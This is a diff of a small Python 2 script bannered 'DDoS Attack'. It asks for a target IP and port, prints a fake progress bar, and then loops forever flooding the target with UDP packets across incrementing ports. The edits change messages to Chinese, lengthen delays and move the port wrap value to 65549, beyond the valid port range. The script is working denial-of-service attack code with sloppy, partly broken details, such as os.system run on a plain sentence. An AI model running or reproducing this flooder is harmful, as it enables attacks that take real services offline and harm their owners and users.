@@ -24,31 +24,31 @@ print "|  _ \|  _  \  ___  ___         / \ | |_| |_ __ _  ___| | __           "
 print "| | | | | |  |/ _ \/ __|       / _ \| __| __/ _` |/ __| |/ /        "
 print "| |_| | |_|  | (_) \__ \      / ___ \ |_| || (_| | (__|   <      "
 print "|____/|_____/ \___/|___/     /_/   \_\__|\__\__,_|\___|_|\_\                       "
-
+print "你看你玛瑙"
 
 
 print
 ip = raw_input("IP : ")
-port = input("duankou : ")
+port = input("port : ")
 
 os.system("clear")
-os.system("The DDos is starting")
+os.system("即将启动")
 print "[                    ] 0% "
-time.sleep(3)
+time.sleep(5)
 print "[=====               ] 25%"
-time.sleep(3)
+time.sleep(5)
 print "[==========          ] 50%"
-time.sleep(3)
+time.sleep(5)
 print "[===============     ] 75%"
-time.sleep(3)
+time.sleep(5)
 print "[====================] 100%"
-time.sleep(3)
+time.sleep(5)
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
      print "Send %s packet to %s throught port :%s"%(sent,ip,port)
-     if port == 1464:
+     if port == 65549:
        port = 1
 
